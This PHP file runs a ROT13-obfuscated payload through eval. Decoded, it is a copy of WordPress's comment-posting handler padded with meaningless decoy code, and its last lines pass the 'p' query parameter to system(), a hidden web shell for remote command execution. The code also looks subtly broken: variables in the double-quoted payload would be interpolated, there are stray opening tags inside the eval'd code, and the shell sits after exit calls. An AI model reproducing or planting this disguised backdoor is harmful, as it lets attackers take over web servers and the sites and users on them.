<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Unaqyrf Pbzzrag Cbfg gb JbeqCerff naq ceriragf qhcyvpngr pbzzrag cbfgvat.
 *
 * @cnpxntr JbeqCerff
 */

vs ( 'CBFG' !== $_FREIRE['ERDHRFG_ZRGUBQ'] ) {
	$cebgbpby = $_FREIRE['FREIRE_CEBGBPBY'];
	vs ( ! va_neenl( $cebgbpby, neenl( 'UGGC/1.1', 'UGGC/2', 'UGGC/2.0', 'UGGC/3' ), gehr ) ) {
		$cebgbpby = 'UGGC/1.0';
	}

	urnqre( 'Nyybj: CBFG' );
	urnqre( \"$cebgbpby 405 Zrgubq Abg Nyybjrq\" );
	urnqre( 'Pbagrag-Glcr: grkg/cynva' );
	rkvg;
}

/** Frgf hc gur JbeqCerff Raivebazrag. */
erdhver __QVE__ . '/jc-ybnq.cuc';

abpnpur_urnqref();

$pbzzrag = jc_unaqyr_pbzzrag_fhozvffvba( jc_hafynfu( $_CBFG ) );
vs ( vf_jc_reebe( $pbzzrag ) ) {
	$qngn = (vag) $pbzzrag->trg_reebe_qngn();
	vs ( ! rzcgl( $qngn ) ) {
		jc_qvr(
			'<c>' . $pbzzrag->trg_reebe_zrffntr() . '</c>',
			__( 'Pbzzrag Fhozvffvba Snvyher' ),
			neenl(
				'erfcbafr'  => $qngn,
				'onpx_yvax' => gehr,
			)
		);
	} ryfr {
		rkvg;
	}
}

$hfre            = jc_trg_pheerag_hfre();
$pbbxvrf_pbafrag = ( vffrg( $_CBFG['jc-pbzzrag-pbbxvrf-pbafrag'] ) );

/**
 * Sverf nsgre pbzzrag pbbxvrf ner frg.
 *
 * @fvapr 3.4.0
 * @fvapr 4.9.6 Gur `$pbbxvrf_pbafrag` cnenzrgre jnf nqqrq.
 *
 * @cnenz JC_Pbzzrag $pbzzrag         Pbzzrag bowrpg.
 * @cnenz JC_Hfre    $hfre            Pbzzrag nhgube'f hfre bowrpg. Gur hfre znl abg rkvfg.
 * @cnenz obby       $pbbxvrf_pbafrag Pbzzrag nhgube'f pbafrag gb fgber pbbxvrf.
 */
qb_npgvba( 'frg_pbzzrag_pbbxvrf', $pbzzrag, $hfre, $pbbxvrf_pbafrag );

$ybpngvba = rzcgl( $_CBFG['erqverpg_gb'] ) ? trg_pbzzrag_yvax( $pbzzrag ) : $_CBFG['erqverpg_gb'] . '#pbzzrag-' . $pbzzrag->pbzzrag_VQ;

// Vs hfre qvqa'g pbafrag gb pbbxvrf, nqq fcrpvsvp dhrel nethzragf gb qvfcynl gur njnvgvat zbqrengvba zrffntr.
vs ( ! $pbbxvrf_pbafrag && 'hanccebirq' === jc_trg_pbzzrag_fgnghf( $pbzzrag ) && ! rzcgl( $pbzzrag->pbzzrag_nhgube_rznvy ) ) {
	$ybpngvba = nqq_dhrel_net(
		neenl(
			'hanccebirq'      => $pbzzrag->pbzzrag_VQ,
			'zbqrengvba-unfu' => jc_unfu( $pbzzrag->pbzzrag_qngr_tzg ),
		),
		$ybpngvba
	);
}

/**
 * Svygref gur ybpngvba HEV gb fraq gur pbzzragre nsgre cbfgvat.
 *
 * @fvapr 2.0.5
 *
 * @cnenz fgevat     $ybpngvba Gur 'erqverpg_gb' HEV frag ivn $_CBFG.
 * @cnenz JC_Pbzzrag $pbzzrag  Pbzzrag bowrpg.
 */
$ybpngvba = nccyl_svygref( 'pbzzrag_cbfg_erqverpg', $ybpngvba, $pbzzrag );

jc_fnsr_erqverpg( $ybpngvba );
rkvg;

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>